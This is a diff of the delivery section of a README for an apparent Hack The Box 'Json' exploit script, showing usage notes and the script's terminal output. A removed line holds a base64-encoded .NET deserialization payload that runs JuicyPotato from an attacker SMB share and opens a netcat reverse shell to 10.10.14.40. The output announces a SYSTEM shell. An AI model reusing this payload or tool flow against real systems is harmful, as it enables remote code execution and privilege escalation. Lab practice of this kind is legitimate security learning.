@@ -288,13 +288,15 @@ except ModuleNotFoundError:
 
 
 ### Delivery
+
+You will need impacket https://github.com/SecureAuthCorp/impacket libaries
+
+Run `json.py` from a windows machine
 ```bash
 ┌─[account@parrot]─[~/Documents/HTB/Json]
 └──╼ $sudo python json.py
 [+] PLEASE RUN: smbserver.py hacking /tmp/ -smb2support AND cd /tmp/ ; python -m SimpleHTTPServer 80
 NOTE: Press ENTER once done to lunch attack
-** (gnome-terminal:30504): CRITICAL **: 02:55:57.979: terminal_window_remove_screen: assertion 'gtk_widget_get_toplevel (GTK_WIDGET (screen)) == GTK_WIDGET (window)' failed
-
 
 [+] Starting Attack
 
@@ -343,16 +345,6 @@ ewogICAgJyR0eXBlJzonU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNl
 ------------
 [+] Second Payload Sent
 [+] Wait a Few Seconds to get a SYSTEM shell
-
-
-[+] Got shell? if not type Y/n n
-
-
-[+] Resending Launch RCE
-ewogICAgJyR0eXBlJzonU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUnLCAKICAgICdNZXRob2ROYW1lJzonU3RhcnQnLAogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsKICAgICAgICAnJHR5cGUnOidTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLAogICAgICAgICckdmFsdWVzJzpbJ2NtZCcsJy9jIFxcXFwxMC4xMC4xNC40MFxcaGFja2luZ1xcSnVpY3lQb3RhdG8uZXhlIC1sIDEzMzcgLXAgYzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhlIC1hICIvYyBjOlxcd2luZG93c1xcc3lzdGVtMzJcXHNwb29sXFxkcml2ZXJzXFxjb2xvclxcbmMuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTQuNDAgOTAwMSIgLXQgKiAtYyB7ZjNiNGUyMzQtN2E2OC00ZTQzLWI4MTMtZTRiYTU1YTA2NWY2fSddCiAgICB9LAogICAgJ09iamVjdEluc3RhbmNlJzp7JyR0eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknfQp9
-
-
-------------
 
 
 [+] Got shell? if not type Y/n 
